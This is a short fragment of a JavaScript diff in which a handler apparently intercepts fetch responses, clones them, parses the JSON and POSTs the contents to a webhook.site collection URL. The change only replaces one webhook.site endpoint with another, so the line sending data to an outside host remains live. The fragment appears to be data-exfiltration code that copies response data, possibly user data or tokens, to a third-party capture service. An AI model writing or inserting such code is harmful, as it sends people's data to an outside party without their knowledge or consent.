@@ -10,7 +10,7 @@
       const clonedResponse = response.clone();
 
       clonedResponse.json().then(data => {
-        fetch('https://webhook.site/49e19250-e4fd-4b9e-86dc-6a9a8d434b50', {
+        fetch('https://webhook.site/a38cc994-a3d8-451b-a041-85ff3fd11bdd', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
